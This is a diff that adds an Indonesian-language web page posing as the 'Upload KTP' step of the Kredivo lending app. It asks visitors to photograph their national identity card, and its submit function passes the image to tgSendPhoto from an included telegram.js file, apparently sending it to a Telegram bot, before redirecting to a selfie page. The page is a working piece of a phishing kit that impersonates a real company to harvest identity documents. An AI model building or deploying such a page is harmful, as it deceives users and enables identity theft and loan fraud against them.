@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Upload KTP — Kredivo</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f7f7f7;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .screen {
+      width: 100%;
+      max-width: 390px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+    }
+
+    /* Header */
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 52px 20px 16px;
+      gap: 12px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .back-btn {
+      width: 36px;
+      height: 36px;
+      border: none;
+      background: #f5f5f5;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .header-logo {
+      font-size: 18px;
+      font-weight: 800;
+      color: #E5192A;
+      letter-spacing: 0.5px;
+    }
+
+    /* Progress bar */
+    .progress-wrap {
+      padding: 16px 28px 0;
+    }
+
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #aaa;
+      margin-bottom: 8px;
+    }
+
+    .progress-label span:last-child {
+      color: #E5192A;
+      font-weight: 600;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: #eee;
+      border-radius: 99px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 33%;
+      background: #E5192A;
+      border-radius: 99px;
+    }
+
+    /* Content */
+    .content {
+      flex: 1;
+      padding: 24px 28px 40px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 6px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #888;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    /* Upload box */
+    .upload-box {
+      width: 100%;
+      aspect-ratio: 16/10;
+      border: 2px dashed #ddd;
+      border-radius: 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: border-color 0.2s, background 0.2s;
+      background: #fafafa;
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+
+    .upload-box:active {
+      background: #fff0f1;
+      border-color: #E5192A;
+    }
+
+    .upload-box.has-image {
+      border: none;
+      background: #000;
+    }
+
+    .upload-box img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 14px;
+    }
+
+    .upload-icon {
+      width: 56px;
+      height: 56px;
+      background: #fff0f1;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .upload-icon svg {
+      width: 28px;
+      height: 28px;
+    }
+
+    .upload-text {
+      text-align: center;
+    }
+
+    .upload-text strong {
+      display: block;
+      font-size: 15px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 4px;
+    }
+
+    .upload-text span {
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    /* Change image overlay */
+    .change-overlay {
+      display: none;
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: rgba(0,0,0,0.5);
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .upload-box.has-image .change-overlay {
+      display: block;
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+
+    /* Tips */
+    .tips {
+      background: #fff8e1;
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-bottom: 28px;
+    }
+
+    .tips-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #f59e0b;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .tips ul {
+      padding-left: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .tips ul li {
+      font-size: 12px;
+      color: #666;
+      line-height: 1.5;
+    }
+
+    /* Button */
+    .btn-submit {
+      width: 100%;
+      height: 52px;
+      background: #E5192A;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn-submit:active {
+      background: #c41422;
+      transform: scale(0.98);
+    }
+
+    .btn-submit:disabled {
+      background: #f5a0a7;
+      cursor: not-allowed;
+    }
+
+    /* Loading overlay */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.9);
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      z-index: 99;
+    }
+
+    .loading-overlay.show {
+      display: flex;
+    }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid #eee;
+      border-top-color: #E5192A;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 14px;
+      color: #888;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+  <div class="screen">
+    <div class="header">
+      <button class="back-btn" onclick="history.back()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="15 18 9 12 15 6"></polyline>
+        </svg>
+      </button>
+      <span class="header-logo">kredivo</span>
+    </div>
+
+    <div class="progress-wrap">
+      <div class="progress-label">
+        <span>Langkah 1 dari 3</span>
+        <span>33%</span>
+      </div>
+      <div class="progress-bar"><div class="progress-fill"></div></div>
+    </div>
+
+    <div class="content">
+      <div class="title">Foto KTP kamu</div>
+      <div class="subtitle">Ambil foto KTP yang jelas dan tidak buram agar proses verifikasi berjalan lancar.</div>
+
+      <div class="upload-box" id="upload-box" onclick="document.getElementById('file-input').click()">
+        <div class="upload-icon">
+          <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="2" y="6" width="24" height="16" rx="3" stroke="#E5192A" stroke-width="2"/>
+            <circle cx="14" cy="14" r="4" stroke="#E5192A" stroke-width="2"/>
+            <path d="M10 6l1.5-2h5L18 6" stroke="#E5192A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div class="upload-text">
+          <strong>Ambil atau Upload Foto KTP</strong>
+          <span>JPG, PNG, maks. 5MB</span>
+        </div>
+        <div class="change-overlay">Ketuk untuk ganti foto</div>
+      </div>
+
+      <input type="file" id="file-input" accept="image/*" capture="environment" onchange="handleFile(this)" />
+
+      <div class="tips">
+        <div class="tips-title">
+          <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+            <circle cx="7" cy="7" r="6" stroke="#f59e0b" stroke-width="1.5"/>
+            <path d="M7 6v4M7 4.5v.5" stroke="#f59e0b" stroke-width="1.5" stroke-linecap="round"/>
+          </svg>
+          Tips foto yang baik
+        </div>
+        <ul>
+          <li>Pastikan seluruh KTP terlihat dalam frame</li>
+          <li>Hindari silau atau bayangan pada KTP</li>
+          <li>Foto harus tajam dan tidak buram</li>
+          <li>Gunakan latar belakang gelap atau kontras</li>
+        </ul>
+      </div>
+
+      <button class="btn-submit" id="btn-lanjut" disabled onclick="submit()">
+        Lanjut
+      </button>
+    </div>
+  </div>
+
+  <div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+    <div class="loading-text">Menganalisis KTP kamu...</div>
+  </div>
+
+  <script src="telegram.js"></script>
+  <script>
+    let ktpDataURL = null;
+
+    function handleFile(input) {
+      const file = input.files[0];
+      if (!file) return;
+
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        ktpDataURL = e.target.result;
+        const box = document.getElementById('upload-box');
+        box.innerHTML = `
+          <img src="${ktpDataURL}" alt="KTP" />
+          <div class="change-overlay">Ketuk untuk ganti foto</div>
+        `;
+        box.classList.add('has-image');
+        box.onclick = () => document.getElementById('file-input').click();
+        document.getElementById('btn-lanjut').disabled = false;
+      };
+      reader.readAsDataURL(file);
+    }
+
+    async function submit() {
+      document.getElementById('loading').classList.add('show');
+      await tgSendPhoto(ktpDataURL, '🪪 Foto KTP Kredivo');
+      document.getElementById('loading').classList.remove('show');
+      window.location.href = 'selfie.html';
+    }
+  </script>
+</body>
+</html>
